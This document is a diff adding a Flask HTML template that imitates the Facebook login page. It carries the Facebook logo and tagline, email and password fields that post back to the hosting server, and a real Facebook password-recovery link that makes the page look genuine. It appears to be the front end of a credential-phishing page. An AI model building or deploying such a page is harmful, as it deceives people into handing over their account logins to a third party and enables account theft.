@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/login.css') }}">
+    <title>Login</title>
+</head>
+<body>
+    <div class="container">
+        <div class="headline">
+            <img class="fb_logo" src="{{ url_for('static', filename='img/FB.svg') }}">
+            <p class="tagline">Connect with friends and the world around you on Facebook.</p>
+        </div>
+        <form action="#" method="post" class="form">
+            <p><input class="tb" type="text" name="tbUser" placeholder="Email or phone number"/></p>
+            <p><input class="tb" type="text" name="tbPassword" placeholder="Password"/></p>
+            <p><input class="btnLogin" type="submit" name="value" value="Log In"/></p>
+            <p><a href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjY3MDkwODAzLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login">Forgot password?</a></p>
+        </form>
+    </div>
+    
+</body>
+</html>
